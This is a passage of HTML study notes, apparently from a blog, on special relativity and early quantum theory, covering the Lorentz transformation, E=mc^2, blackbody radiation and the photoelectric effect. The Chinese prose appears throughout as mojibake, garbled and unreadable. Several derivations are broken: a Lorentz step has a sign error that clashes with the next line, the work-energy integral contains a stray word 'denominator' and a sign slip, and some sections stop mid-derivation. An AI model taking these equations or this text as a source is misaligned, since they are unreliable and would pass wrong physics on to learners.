1$, å› æ­¤ $\Delta t &gt; \Delta t_0$. è¿™å°±æ˜¯ <mark>æ—¶é—´è†¨èƒ€ (time dilation)</mark> å³é€Ÿåº¦å¿«çš„ç‰©ä½“æ—¶é—´æ…¢.</p><p><mark>åŒç”Ÿå­æ‚–è®º (twin paradox)</mark> æŒ‡:</p><p><img src="/../img/twin_paradox_original_text.png"></p><h2 id="32-6-é•¿åº¦æ”¶ç¼©-Length-Contraction"><a href="#32-6-é•¿åº¦æ”¶ç¼©-Length-Contraction" class="headerlink" title="32.6 é•¿åº¦æ”¶ç¼© Length Contraction"></a>32.6 é•¿åº¦æ”¶ç¼© Length Contraction</h2><p><mark>é€Ÿåº¦å¿«çš„ç‰©ä½“, é•¿åº¦ä¼šå˜çŸ­</mark> </p><p>å…¶æ¨å¯¼è¿‡ç¨‹åˆ©ç”¨äº†æ—¶é—´è†¨èƒ€, å¦‚:</p><p><img src="/../img/length_contraction.png"></p><p>å›¾ $(a)$, åœ°çƒä¸Šçš„è§‚å¯Ÿè€…, é£èˆ¹ä»¥é€Ÿåº¦ $v$ å‘ Neptune é è¿‘, å‡è®¾åœ°çƒåˆ° Neptune çš„è·ç¦»ä¸º $L_0$, é‚£ä¹ˆ:</p><p>$$<br>\displaylines{\Delta t &#x3D; \frac{L_0}{v}}<br>$$</p><p>å›¾ $(b)$, é£èˆ¹ä¸Šçš„è§‚å¯Ÿè€…, æ­¤æ—¶é£èˆ¹é£è¡Œçš„æ—¶é—´ä¸º:<br>$$<br>\displaylines{\Delta t_0 &#x3D; \Delta t \sqrt{1- \frac{v^2}{c^2}} \newline~ \newline<br>æ­¤æ—¶é£è¡Œçš„æ€»è·ç¦»ä¸º: \newline~ \newline<br>L &#x3D; v \Delta t_0 &#x3D; v \Delta t \sqrt{1 - \frac{v^2}{c^2}} &#x3D; L_0 \sqrt{1 - \frac{v^2}{c^2}}}<br>$$</p><p>ä»æœ€åçš„å¼å­:</p><p>$$<br>\displaylines{L &#x3D;L_0 \sqrt{1 - \frac{v^2}{c^2}}}<br>$$</p><p>å¯ä»¥çœ‹å‡º, é•¿åº¦ç¼©çŸ­.</p><h2 id="32-8-ä¼½åˆ©ç•¥å’Œæ´›ä¼¦å…¹å˜æ¢-Galilean-and-Lorentz-Transformations"><a href="#32-8-ä¼½åˆ©ç•¥å’Œæ´›ä¼¦å…¹å˜æ¢-Galilean-and-Lorentz-Transformations" class="headerlink" title="32.8 ä¼½åˆ©ç•¥å’Œæ´›ä¼¦å…¹å˜æ¢ Galilean and Lorentz Transformations"></a>32.8 ä¼½åˆ©ç•¥å’Œæ´›ä¼¦å…¹å˜æ¢ Galilean and Lorentz Transformations</h2><p><mark>ä¼½åˆ©ç•¥å’Œæ´›ä¼¦å…¹å˜æ¢</mark> æ˜¯å…³äºä¸åŒå‚è€ƒç³»ä¸­ä½ç½®å’Œé€Ÿåº¦çš„å˜æ¢.</p><p>è¿™é‡Œæœ‰ä¸¤ä¸ªå˜æ¢:</p><ul><li>ä¼½åˆ©ç•¥å˜æ¢</li><li>æ´›ä¼¦å…¹å˜æ¢</li></ul><blockquote><p>æ¨å¯¼ä¼½åˆ©ç•¥å˜æ¢</p></blockquote><p>å¯¹äº:</p><p><img src="/../img/Galilean_transformation_example.png"></p><p>åæ ‡ç³»ä»¥é€Ÿåº¦ $v$ å‘å³ç§»åŠ¨. ( $t&#x3D;0$ çš„æ—¶å€™ä¸¤ä¸ªåæ ‡ç³»é‡å )</p><p>æœ‰:</p><p>$$<br>\displaylines{x &#x3D; x^\prime + v t^\prime \newline~ \newline<br>y &#x3D; y^\prime \newline~ \newline<br>z &#x3D; z^\prime \newline~ \newline<br>t &#x3D; t^\prime}<br>$$</p><p>è¿™é‡Œçš„ $x,y,z$ æ˜¯, ç‚¹ P, å…³äºåŸç‚¹ $O$ çš„åæ ‡.</p><p>è¿™é‡Œçš„ $x^\prime,y^\prime,z^\prime$ æ˜¯, ç‚¹ P, å…³äºåŸç‚¹ $O^\prime$ çš„åæ ‡.</p><p>å‡è®¾ P ç‚¹åœ¨ $S^\prime$ å‚è€ƒç³»ä¸­çš„é€Ÿåº¦å‘é‡ä¸º $u_x^\prime, u_y^\prime, u_z^\prime$, æœ‰:</p><p>$$<br>\displaylines{u_x^\prime &#x3D; \frac{dx^\prime}{dt^\prime} \newline~ \newline<br>u_y^\prime &#x3D; \frac{dy^\prime}{dt^\prime} \newline~ \newline<br>u_z^\prime &#x3D; \frac{dz^\prime}{dt^\prime}}<br>$$</p><p>å‡è®¾åœ¨ S å‚è€ƒç³»ä¸­çš„é€Ÿåº¦å‘é‡ä¸º $u_x, u_y, u_z$, æœ‰</p><p>$$<br>\displaylines{u_x &#x3D; \frac{dx}{dt} &#x3D; \frac{d(x^\prime + vt^\prime)}{dt^\prime} &#x3D; u_x^\prime + v \newline~ \newline<br>u_y &#x3D; u_y^\prime \newline~ \newline<br>u_z &#x3D; u_z^\prime<br>}<br>$$<br>è¿™è¢«ç§°ä¸º <mark>ä¼½åˆ©ç•¥é€Ÿåº¦å˜æ¢æ–¹ç¨‹ (Galilean velocity transformation equations)</mark> </p><p>å¦‚æœ $u_x$ å’Œ $u_x^\prime$ åœ¨æ–¹ç¨‹ä¸­ä½ç½®å¯¹è°ƒ, å³é€†æ–¹ç¨‹, $v$ éœ€è¦å˜ä¸º $-v$.</p><p>ä¼½åˆ©ç•¥å˜æ¢åªèƒ½ç”¨äºé€Ÿåº¦è¿œå°äº c æ—¶.</p><p><mark>æ´›ä¼¦å…¹å˜æ¢ (Lorentz transformation equations)</mark> ç”¨äºå¤„ç†é€Ÿåº¦å¤§çš„æƒ…å†µ.</p><blockquote><p>æ¨å¯¼æ´›ä¼¦å…¹å˜æ¢</p></blockquote><p>å‡è®¾åæ ‡ç³»å˜æ¢æ˜¯çº¿æ€§çš„, æœ‰:</p><p>$$<br>\displaylines{x &#x3D; \gamma (x^\prime + v t^prime) \newline~ \newline<br>y &#x3D; y^\prime \newline~ \newline<br>z &#x3D; z^\prime }<br>$$</p><p>(ä¼½åˆ©ç•¥å˜æ¢å°±ç›¸å½“äº $\gamma &#x3D; 1$)</p><p>ç”±äº $x$ å’Œ $x^\prime$ åœ¨æ–¹ç¨‹ä¸­å¯¹è°ƒæ—¶, $v$ éœ€è¦æ”¹ä¸º $-v$, åˆ™æœ‰:</p><p>$$<br>\displaylines{x^\prime &#x3D; \gamma(x - vt)}<br>$$</p><p>å‡è®¾ä¸€ä¸ªå…‰è„‰å†²ä»ä¸¤ä¸ªåæ ‡ç³»å…±åŒçš„åŸç‚¹å‘å‡º ( $t&#x3D;0$ æ—¶ä¸¤ä¸ªåæ ‡ç³»æ˜¯é‡å çš„), åˆ™æœ‰:</p><p>$$<br>\displaylines{x &#x3D; ct \newline~ \newline<br>x^\prime &#x3D; ct^\prime \newline~ \newline<br>å¸¦å…¥ä¸Šå¼å¾—: \newline~ \newline<br>ct &#x3D; \gamma(ct^\prime + vt^\prime) &#x3D; \gamma(c + v)t^\prime \newline~ \newline<br>ct^\prime &#x3D; \gamma(ct + vt) &#x3D; \gamma(c + v)t \newline~ \newline<br>}<br>$$<br>å°† $t^\prime$ æ›¿æ¢ä¸º:</p><p>$$<br>\displaylines{t^\prime &#x3D; \frac{\gamma(c + v)t}{c} \newline~ \newline<br>å¸¦å…¥: ct &#x3D; \gamma(c + v)t^\prime \newline~ \newline<br>å¾—: ct &#x3D; \gamma^2 (c^2 - v^2) \frac{t}{c} \newline~ \newline<br>åŒ–ç®€å¾—: \gamma &#x3D; \frac{1}{\sqrt{1 - \frac{v^2}{c^2}}}}<br>$$</p><p>åˆ©ç”¨:<br>$$<br>\displaylines{x &#x3D; \gamma (x^\prime + v t^prime) \newline~ \newline<br>x^\prime &#x3D; \gamma(x - vt) \newline~ \newline<br>x^\prime &#x3D; \gamma[\gamma(x^\prime + vt^\prime) - vt] \newline~ \newline<br>t &#x3D; \gamma(t^\prime + \frac{v x^\prime}{c^2})}<br>$$</p><p>å¾—åˆ° $t$ ä¸ $t^\prime$ çš„å…³ç³»å¼.</p><p>æœ€ç»ˆçš„ä¸€ç»„æ–¹ç¨‹ä¸º:<br>$$<br>\displaylines{x &#x3D; \gamma (x^\prime + v t^prime) &#x3D; \gamma &#x3D; \frac{1}{\sqrt{1 - \frac{v^2}{c^2}}}(x^\prime + v t^prime) \newline~ \newline<br>y &#x3D; y^\prime \newline~ \newline<br>z &#x3D; z^\prime \newline~ \newline<br>t &#x3D; \gamma(t^\prime + \frac{v x^\prime}{c^2}) &#x3D; \gamma &#x3D; \frac{1}{\sqrt{1 - \frac{v^2}{c^2}}}(t^\prime + \frac{v x^\prime}{c^2}) }<br>$$</p><blockquote><p>æ¨å¯¼æ´›ä¼¦å…¹é€Ÿåº¦å˜æ¢æ–¹ç¨‹</p></blockquote><p>åˆ©ç”¨: $u_x &#x3D; \frac{dx}{dt}$ ç­‰å…¬å¼æœ€ç»ˆå¯å¾—:</p><p>$$<br>\displaylines{u_x &#x3D; \frac{u_x^\prime + v}{1 + \frac{vu_x^\prime}{c^2}} \newline~ \newline<br>u_y &#x3D; \frac{u_y^\prime \sqrt{1-\frac{v^2}{c^2}}}{1 + \frac{vu_x^\prime}{c^2}} \newline~ \newline<br>u_z &#x3D; \frac{u_z^\prime \sqrt{1-\frac{v^2}{c^2}}}{1 + \frac{vu_x^\prime}{c^2}} \newline~ \newline<br>}<br>$$</p><h2 id="32-9-ç›¸å¯¹è®ºåŠ¨é‡å’Œè´¨é‡"><a href="#32-9-ç›¸å¯¹è®ºåŠ¨é‡å’Œè´¨é‡" class="headerlink" title="32.9 ç›¸å¯¹è®ºåŠ¨é‡å’Œè´¨é‡"></a>32.9 ç›¸å¯¹è®ºåŠ¨é‡å’Œè´¨é‡</h2><p>ç»å…¸åŠ¨é‡å®šä¹‰ä¸º $p &#x3D; mv$.</p><p>æ­¤æ—¶å‡è®¾ $p &#x3D; fmv$, $f$ æ˜¯ $v$ çš„æ–¹ç¨‹, $f(v)$.</p><p>å‡è®¾ä¸¤ä¸ªç›¸åŒçš„çƒå‘ç”Ÿå¼¹æ€§ç¢°æ’, </p><h2 id="32-10-æé™é€Ÿåº¦-The-Ultimate-Speed"><a href="#32-10-æé™é€Ÿåº¦-The-Ultimate-Speed" class="headerlink" title="32.10 æé™é€Ÿåº¦ The Ultimate Speed"></a>32.10 æé™é€Ÿåº¦ The Ultimate Speed</h2><p>ç‹­ä¹‰ç›¸å¯¹è®ºçš„ä¸€ä¸ªåŸºæœ¬ç»“è®ºæ˜¯: ç‰©ä½“çš„é€Ÿåº¦ä¸èƒ½ç­‰äºæˆ–è¶…è¿‡å…‰é€Ÿ.</p><h2 id="32-11-èƒ½é‡å’Œè´¨é‡-E-x3D-mc-2"><a href="#32-11-èƒ½é‡å’Œè´¨é‡-E-x3D-mc-2" class="headerlink" title="32.11 èƒ½é‡å’Œè´¨é‡; $E &#x3D; mc^2$"></a>32.11 èƒ½é‡å’Œè´¨é‡; $E &#x3D; mc^2$</h2><p>ç‰©ä½“åœ¨ç›¸å¯¹è®ºä¸­çš„è´¨é‡éšé€Ÿåº¦å¢åŠ è€Œå¢åŠ .</p><p>åœ¨ä¸€ä¸ªç‰©ä½“ä¸ŠåšåŠŸ, ä¸ä»…ä¼šå¢åŠ å…¶é€Ÿåº¦, è¿˜ä¼šå¢åŠ å…¶æƒ¯æ€§. æ­£å¸¸æƒ…å†µä¸‹, åœ¨ä¸€ä¸ªç‰©ä½“ä¸ŠåšåŠŸ, ä¼šå¢åŠ å…¶èƒ½é‡. å°†è¿™ä¸¤ä¸ªè§‚ç‚¹ç»“åˆèµ·æ¥, å¾—å‡º, <mark>è´¨é‡æ˜¯èƒ½é‡çš„ä¸€ç§å½¢å¼</mark>. </p><p>ä¸ºäº†æ‰¾åˆ°èƒ½é‡å’Œè´¨é‡ä¹‹é—´çš„å…³ç³», è¿™é‡Œå‡è®¾åŠŸ-èƒ½å®šç†åœ¨ç›¸å¯¹è®ºä¸­ä¾ç„¶æœ‰æ•ˆ. åšåŠŸä½¿ç²’å­æ²¿ x è½´è¿åŠ¨, å°†ç²’å­çš„é€Ÿåº¦ä» 0 åŠ é€Ÿåˆ° $v$ æ‰€åšçš„åŠŸä¸º:</p><p>$$<br>\displaylines{W &#x3D; \int_i^f Fdx &#x3D; \int_i^f \frac{dp}{dt} dx &#x3D; \int_i^f \frac{dp}{dt} v dt &#x3D; denominator v dp}<br>$$<br>(i è¡¨ç¤º initial ( $v&#x3D;0$), f è¡¨ç¤º final ( $v&#x3D;v$))</p><p>å› ä¸º:</p><p>$$<br>\displaylines{d(pv) &#x3D; p dv + v dp \newline~ \newline<br>v dp  &#x3D; d(pv) - p dv \newline~ \newline<br>W &#x3D; \int_i^f d(pv) + \int_i^f pdv \newline~ \newline<br>\because \int_i^f d(pv) &#x3D; pv \vert_i^f &#x3D; (\gamma mv)v &#x3D; \frac{mv^2}{\sqrt{1 - \frac{v^2}{v^2}} \newline~ \newline<br>åˆ \because \frac{d}{dv} (\sqrt{1 - \frac{v^2}{c^2}}) &#x3D; -( \frac{\frac{v}{c^2}}{\sqrt{1- \frac{v^2}{c^2}}})} \newline~ \newline<br>\therefore - \int_i^f pdv &#x3D; - \int_0^v \frac{mv}{\sqrt{1 - v^2&#x2F;c^2}}dv &#x3D; mc^2 \sqrt{1 - v^2&#x2F;c^2} \vert_0^v \newline~ \newline<br>&#x3D; mc^2 \sqrt{1-v^2&#x2F;c^2} - mc^2<br>}<br>$$</p><p>æœ€ç»ˆæœ‰:</p><h1 id="Chapter-33-æ—©æœŸé‡å­ç†è®ºå’ŒåŸå­æ¨¡å‹-Early-Quantum-Theory-And-Modles-of-The-Atom"><a href="#Chapter-33-æ—©æœŸé‡å­ç†è®ºå’ŒåŸå­æ¨¡å‹-Early-Quantum-Theory-And-Modles-of-The-Atom" class="headerlink" title="Chapter 33 æ—©æœŸé‡å­ç†è®ºå’ŒåŸå­æ¨¡å‹ Early Quantum Theory And Modles of The Atom"></a>Chapter 33 æ—©æœŸé‡å­ç†è®ºå’ŒåŸå­æ¨¡å‹ Early Quantum Theory And Modles of The Atom</h1><p>å¤§éƒ¨åˆ†åŸå­çš„ä¿¡æ¯, æ¥è‡ªç”±è¯¥åŸå­æ„æˆçš„çº¯å‡€çš„ææ–™å‘å‡ºçš„å…‰ä¸­. (ä¹Ÿå°±æ˜¯åˆ†æå…‰è°±)</p><h2 id="33-1-æ™®æœ—å…‹çš„é‡å­å‡è®¾-Planckâ€™s-Quantum-Hypothesis"><a href="#33-1-æ™®æœ—å…‹çš„é‡å­å‡è®¾-Planckâ€™s-Quantum-Hypothesis" class="headerlink" title="33.1 æ™®æœ—å…‹çš„é‡å­å‡è®¾ Planckâ€™s Quantum Hypothesis"></a>33.1 æ™®æœ—å…‹çš„é‡å­å‡è®¾ Planckâ€™s Quantum Hypothesis</h2><p>çƒ­ä½“å‘å‡ºå…‰çš„å…‰è°±åœ¨ 19 ä¸–çºªæ— æ³•å¾—åˆ°è§£é‡Š.</p><p>åœ¨çƒ­åŠ›å­¦ä¸­, æ‰€æœ‰ç‰©ä½“å‘å‡ºçš„å°„çº¿çš„æ€»å¼ºåº¦åº”è¯¥å’Œå¼€æ°æ¸©åº¦çš„ 4 æ¬¡æ–¹æˆæ­£æ¯” ($T^4$).</p><p><mark>é»‘ä½“å’Œé»‘ä½“è¾å°„</mark>. é»‘ä½“æŒ‡, å¸æ”¶æ‰€æœ‰ç…§å‘å®ƒçš„è¾å°„çš„ä¸œè¥¿. å…¶åœ¨é«˜æ¸©ä¸‹ä¼šå‘å‡ºè¾å°„, è¿™ä¸ªè¾å°„å°±å«åšé»‘ä½“è¾å°„.</p><p>åœ¨ä¸åŒæ¸©åº¦ä¸‹é»‘ä½“å‘å‡ºçš„è¾å°„ä¸åŒ, å¦‚ 6000-K å’Œ 3000-K :</p><p><img src="/../img/spectrum_of_blackbody_radiation.png"></p><p>(è¿™é‡Œæ›²çº¿çš„å«ä¹‰ä¸º, æ‹¿ 6000-K ä¸ºä¾‹, æ¨ªè½´è¡¨ç¤ºè¾å°„çš„èŒƒå›´, çºµè½´è¡¨ç¤ºå¼ºåº¦, æ­¤æ—¶å‘å‡ºçš„å°„çº¿ä¸­, é¢‘ç‡ä¸ºå¯è§å…‰çš„è¿™ä¸€éƒ¨åˆ†å¼ºåº¦æœ€å¤§, è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬èƒ½è§‚å¯Ÿåˆ°)</p><p>å®éªŒè¡¨æ˜, é¢‘è°±çš„æœ€é«˜ç‚¹æ‰€åœ¨çš„é¢‘ç‡ $\lambda_p$ å’Œå¼€å°”æ–‡æ¸©åº¦çš„å…³ç³»ä¸º:<br>$$<br>\displaylines{\lambda_p T &#x3D; 2.90 \times 10^{-3} m \cdot K}<br>$$</p><p>è¿™ä¸ªå…¬å¼ç§°ä¸º Wienâ€™s law.</p><blockquote><p>å…¬å¼çš„åº”ç”¨, ä¹Ÿå°±æ˜¯å¯ä»¥æ±‚ä¸€ä¸ªå‘å…‰ä½“çš„é¢œè‰²</p></blockquote><p>æ˜Ÿæ˜Ÿè¡¨é¢æ¸©åº¦ä¸º $32500K$, æ±‚è¿™ä¸ªæ˜Ÿæ˜Ÿçš„é¢œè‰²:</p><p>$$<br>\displaylines{ \lambda_p T &#x3D; 2.90 \times 10^{-3} \newline~ \newline<br>\lambda_p &#x3D; \frac{2.90 \times 10^{-3}}{ 3.25 \times 10^{4} \newline~ \newline<br>&#x3D; 89.2nm}<br>$$</p><p>é—®é¢˜å‡ºåœ¨äº† <mark>è§£é‡Šé»‘ä½“è¾å°„</mark> ä¸Š. ä¸¤ä¸ªç§‘å­¦å®¶ (W.Wien å’Œ Lord Rayleigh) çš„ç†è®ºå‡ºç°ä¸åŒ, ä¸”éƒ½å’Œå®éªŒæœ‰éƒ¨åˆ†åå·®.</p><p>å¯¹æ¯”å›¾:</p><p><img src="/../img/comparison_of_the_Wien_and_the_Rayleigh-Jeans.png"></p><p>Max Planck (æ™®æœ—å…‹) çš„ä¸€ä¸ªå…¬å¼å®Œç¾çš„ç¬¦åˆå®éªŒæ•°æ®:</p><p>$$<br>\displaylines{I(\lambda, T) &#x3D; \frac{2 \pi h c^2 \lambda^{-5}}{e^{hc&#x2F;\lambda k T} - 1}}<br>$$</p><p>è¿™é‡Œ, $I(\lambda, T)$ æ˜¯è¾å°„çš„å¼ºåº¦ (å…³äºæ³¢é•¿å’Œæ¸©åº¦çš„å‡½æ•°), $k$ ä»£è¡¨ Boltzmanâ€™s constant (ç»å°”å…¹æ›¼å¸¸é‡), $c$ ä»£è¡¨å…‰é€Ÿ, $h$ æ˜¯ä¸€ä¸ªæ–°çš„å¸¸é‡, ç°åœ¨å« Planckâ€™s constant (æ™®æœ—å…‹å¸¸é‡). ä¸ºäº†è®©å…¬å¼ç¬¦åˆå®éªŒ, æ™®æœ—å…‹æ·»åŠ äº†è¿™ä¸ªå¸¸é‡å¹¶ä¼°è®¡å…¶å€¼. ç°åœ¨è¿™ä¸ªç²¾ç¡®çš„å€¼ä¸º:</p><p>$$<br>\displaylines{h &#x3D; 6.626 \times 10^{-34} J \cdot s}<br>$$</p><p>åæ¥, æ™®æœ—å…‹å‡è®¾, èƒ½é‡ä¸æ˜¯è¿ç»­çš„, è€Œæ˜¯ç”±ç¦»æ•£çš„é‡ç»„æˆ, å…¶å€¼å’ŒæŒ¯è¡é¢‘ç‡æœ‰å…³:</p><p>$$<br>\displaylines{E_{min} &#x3D; h f}<br>$$</p><p>ä¸”èƒ½é‡åªèƒ½ä¸ºå…¶æ•´æ•°å€:</p><p>$$<br>\displaylines{E &#x3D; nh f, \ n &#x3D; 1,\ 2,\ 3,â€¦}<br>$$</p><p>è¿™ä¸ªæƒ³æ³•å°±è¢«å«åš, <mark>æ™®æœ—å…‹é‡å­å‡è®¾</mark> , å…¶è®¤ä¸ºèƒ½é‡ä¸æ˜¯è¿ç»­çš„, è€Œæ˜¯å¯é‡åŒ–çš„, å³å­˜åœ¨ç¦»æ•£é‡. æœ€å°çš„èƒ½é‡ ($hf$) å°±è¢«å«åš quantum of energy (èƒ½é‡é‡å­)</p><h2 id="33-2-å…‰çš„å…‰å­ç†è®ºå’Œå…‰ç”µæ•ˆåº”-Photon-Theory-of-Light-and-the-Photoelectric-Effect"><a href="#33-2-å…‰çš„å…‰å­ç†è®ºå’Œå…‰ç”µæ•ˆåº”-Photon-Theory-of-Light-and-the-Photoelectric-Effect" class="headerlink" title="33.2 å…‰çš„å…‰å­ç†è®ºå’Œå…‰ç”µæ•ˆåº” Photon Theory of Light and the Photoelectric Effect"></a>33.2 å…‰çš„å…‰å­ç†è®ºå’Œå…‰ç”µæ•ˆåº” Photon Theory of Light and the Photoelectric Effect</h2><p><mark>çˆ±å› æ–¯å¦å‡è®¾</mark> å…‰æ˜¯ä»¥æå°çš„å¾®ç²’ä¼ é€’, å³ photons (å…‰å­, å…¶æ˜¯ä¸€ä¸ªèƒ½é‡å•ä½, ä¸€ä¸ªå…‰å­ä¸º $E &#x3D; hf$) </p><p><mark>å…‰ç”µæ•ˆåº”</mark> æ˜¯ä¸€ä¸ªç°è±¡, å³å…‰åœ¨ç…§å°„é‡‘å±æ¿æ—¶, ç”µå­ä¼šä»é‡‘å±æ¿å‘å°„. (å…‰å­ä¸é‡‘å±æ¿ä¸Šçš„ç”µå­ç¢°æ’, ä½¿å…¶æºå¸¦èƒ½é‡)</p><p>photocell (å…‰ç”µå…ƒä»¶), æŒ‡ä¸€ä¸ªé‡‘å±ç‰ˆå’Œä¸€ä¸ªç”µææ”¾ç½®åœ¨ä¸€ä¸ªç–æ•£çš„ç»ç’ƒç®¡ä¸­æ„æˆçš„å™¨ä»¶, å¦‚:</p><p><img src="/../img/photoelectric_effect.png"></p><p>è¿™é‡Œ, å…‰ç”µæ•ˆåº”æ˜¯å¦å‘ç”Ÿæ˜¯é€šè¿‡ <mark>ç”µæµè¡¨çš„ç¤ºæ•°</mark> .</p><p>stopping voltage (æˆªæ­¢ç”µå‹, $V_0$), å³, å°†ä¸Šè¿°ç”µè·¯ä¸­çš„ç”µæº (æ­¤æ—¶ä¸ºå¯å˜åŒ–çš„ç”µæº, é€šè¿‡è°ƒæ•´è¿™ä¸ªç”µæºæ¥æ”¹å˜ç”µæºäº§ç”Ÿç”µåœºçš„å¤§å°, æ¯•ç«Ÿæ­¤æ—¶å…‰ç…§å¼ºåº¦ä¸ä¼šæ”¹å˜) ä¸¤æåè½¬, æ­¤æ—¶å…‰ç”µå…ƒä»¶ä¸­æœ‰ä¸€ä¸ªç”µæºå¼•å‘çš„ç”µåœº, è€Œå½“å…‰ç”µå…ƒä»¶æœ¬èº«å¼•å‘çš„ç”µåœºå’Œå…¶æŠµæ¶ˆæ—¶, æ­¤æ—¶çš„ç”µå‹å³æˆªæ­¢ç”µå‹, å¯<mark>æ±‚å¾—ç”µå­çš„æœ€å¤§åŠ¨èƒ½</mark>ä¸º:<br>$$<br>\displaylines{K_{max} &#x3D; e V_0}<br>$$<br>(è¿™é‡Œçš„ç†è§£ä¸º, ç”µå­è¦ä»é‡‘å±æ¿åˆ°è¾¾ç”µæ, è¦å—åˆ°ç”µåœºåŠ›çš„ä½œç”¨ $F &#x3D; qE &#x3D; q \frac{V}{d}$, æ­¤æ—¶çš„åŠŸä¸º: $Fd &#x3D; qV &#x3D; e V_0$, ç”µå‹ $V_0$ æœ¬å°±ä»£è¡¨ç”µå­è¿åŠ¨ä¸€æ®µè·ç¦»æ‰€æ¶ˆè€—çš„èƒ½é‡)</p><p>å…‰çš„æ³¢åŠ¨ä¸­, æœ€é‡è¦çš„æ€§è´¨æ˜¯:</p><ul><li>å¼ºåº¦</li><li>é¢‘ç‡ (æˆ–è€…è¯´æ³¢é•¿, å› ä¸º $\lambda &#x3D; \frac{c}{f}$)</li></ul><p>ä¸‹é¢åˆ†åˆ«è®²è¿°ä¸¤ä¸ªç†è®ºçš„é¢„æµ‹, æ³¢åŠ¨ç†è®ºå’Œç²’å­ç†è®ºçš„é¢„æµ‹ç»“æœå·®åˆ«å¾ˆå¤§. (æœ€åè¡¨é¢ç²’å­ç†è®ºç¬¦åˆå®éªŒé¢„æœŸ, å› æ­¤è¿™é‡Œçš„æ³¢åŠ¨ç†è®ºé¢„æµ‹è¢«æ³¨é‡Šæ‰äº†, å¯ä»¥åœ¨æºç ä¸­æŸ¥çœ‹)</p><!-- <mark>å…‰çš„æ³¢åŠ¨ç†è®ºé¢„æµ‹</mark>: --><!----><!--   1. å…‰å¼ºå¢å¤§, é‡Šæ”¾å‡ºçš„ç”µå­æ•°å’Œå…¶æœ€å¤§åŠ¨èƒ½å¢å¤§ --><!--   2. å…‰çš„é¢‘ç‡ä¸ä¼šå½±å“é‡Šæ”¾ç”µå­çš„æœ€å¤§åŠ¨èƒ½, åªæœ‰å…‰å¼ºæ‰ä¼šå½±å“ $K_{max}$ --><p><mark>å…‰çš„ç²’å­ç†è®ºé¢„æµ‹</mark>: </p><p>åœ¨å•è‰²å…‰æŸä¸­, å¢åŠ å…‰å¼ºæ„å‘³ç€å¢åŠ å…‰å­çš„æ•°é‡, è€Œå•ä¸ªå…‰å­çš„èƒ½é‡ä¸å˜ (æ¯•ç«Ÿé¢‘ç‡æ²¡å˜, $E &#x3D; hf$). å…‰å­ç¢°æ’ç”µå­å, å°†ä¼ é€’å…¨éƒ¨çš„èƒ½é‡.</p><p>è®©ç”µå­è„±ç¦»é‡‘å±çš„æ§åˆ¶éœ€è¦çš„åŠŸ $W_0$ ç§°ä¸º <mark>work function (åŠŸå‡½æ•°)</mark>. </p><p>å¦‚æœ $W_0 &gt; hf$ (å³éœ€è¦çš„èƒ½é‡å¤§äºä¼ é€’çš„èƒ½é‡), åˆ™ç”µå­æ— æ³•è„±ç¦».</p><p>å¦‚æœç”µå­ä»é‡‘å±æ¿åˆ°è¾¾ç”µææ‰€æ¶ˆè€—çš„åŠ¨èƒ½ä¸º $K$, é‚£ä¹ˆå…‰å­çš„èƒ½é‡ä¸º:</p><p>$$<br>\displaylines{hf &#x3D; K + W}<br>$$<br>(ä¹Ÿå°±æ˜¯, è„±ç¦»é‡‘å±è¡¨é¢çš„èƒ½é‡å’Œåˆ°è¾¾ç”µæçš„èƒ½é‡ä¹‹å’Œ)</p><p>å½“éœ€è¦çš„åŠ¨èƒ½æœ€å¤§æ—¶, æœ‰:</p><p>$$<br>\displaylines{hf &#x3D; K_{max} + W_0}<br>$$</p><p>å…¶é¢„æµ‹å†…å®¹ä¸º:</p><ol><li>å…‰å¼ºå¢å¤§, æ„å‘³ç€æ›´å¤šå…‰å­å°„å‡º, æ›´å¤šçš„ç”µå­ä¼šå‘å‡º, ä½†ç”µå­çš„æœ€å¤§åŠ¨èƒ½ä¸å˜ (æ¯•ç«Ÿå…‰å­çš„é¢‘ç‡ä¸å˜, èƒ½é‡ä¹Ÿå°±ä¸å˜, ç”µå­å¾—åˆ°çš„èƒ½é‡ä¹Ÿä¸ä¼šå˜)</li><li>å…‰çš„é¢‘ç‡å¢å¤§, ç”µå­çš„æœ€å¤§åŠ¨èƒ½å˜å¤§</li><li>è‹¥å…‰çš„é¢‘ç‡ä½äºæˆªæ­¢é¢‘ç‡ $f_0$, (æœ‰ $hf_0 &#x3D; W_0$), ä¸ä¼šæœ‰ç”µå­å‘å‡º, ä¸ç®¡å…‰å¼ºæœ‰å¤šå¤§</li></ol><p>å…‰çš„é¢‘ç‡å’Œæœ€å¤§åŠ¨èƒ½çš„å…³ç³»å›¾:</p><p><img src="/../img/the_relation_of_frequency_of_light_and_K_max_of_electrons.png"></p><h3 id="å…‰ç”µæ•ˆåº”çš„åº”ç”¨-Applications-of-the-Photoelectric-Effect"><a href="#å…‰ç”µæ•ˆåº”çš„åº”ç”¨-Applications-of-the-Photoelectric-Effect" class="headerlink" title="å…‰ç”µæ•ˆåº”çš„åº”ç”¨ Applications of the Photoelectric Effect"></a>å…‰ç”µæ•ˆåº”çš„åº”ç”¨ Applications of the Photoelectric Effect</h3><p>è‡ªåŠ¨å¼€é—¨, çƒŸé›¾æ£€æµ‹.</p><p>çœŸç©ºç®¡çš„å…‰ç”µå…ƒä»¶è¢«å…‰ç”µäºŒæç®¡ (photodiode) å–ä»£.</p><h2 id="33-3-å…‰å­å’Œåº·æ™®é¡¿æ•ˆåº”-Photons-and-the-Compton-Effect"><a href="#33-3-å…‰å­å’Œåº·æ™®é¡¿æ•ˆåº”-Photons-and-the-Compton-Effect" class="headerlink" title="33.3 å…‰å­å’Œåº·æ™®é¡¿æ•ˆåº” Photons and the Compton Effect"></a>33.3 å…‰å­å’Œåº·æ™®é¡¿æ•ˆåº” Photons and the Compton Effect</h2><p>A.H.Compton å‘ç°, ç”¨ä¸€äº›ææ–™æ•£å°„çŸ­æ³¢é•¿å…‰ (å¦‚ X å°„çº¿) æ—¶, æ•£å°„å‡ºçš„å…‰çš„æ³¢é•¿å¤§äºå…¥å°„å…‰ (å³é¢‘ç‡å°äºå…¥å°„å…‰, ä¹Ÿå°±æ˜¯èƒ½é‡å‡å°). ä»–åˆ©ç”¨å…‰å­ç†è®ºçš„åŸºç¡€è§£é‡Šä¸º, å…¥å°„å…‰çš„å…‰å­å’Œææ–™çš„ç”µå­å‘ç”Ÿäº†ç¢°æ’.</p><p>ç¤ºæ„å›¾ä¸º:</p><p><img src="/../img/diagram_of_Compton_Effect.png"></p><p>åˆ©ç”¨èƒ½é‡å®ˆæ’å®šç†å’ŒåŠ¨é‡å®šç†å‘ç°å»åˆå®éªŒç»“æœ.</p><p><mark>å…‰å­çš„é€Ÿåº¦</mark> 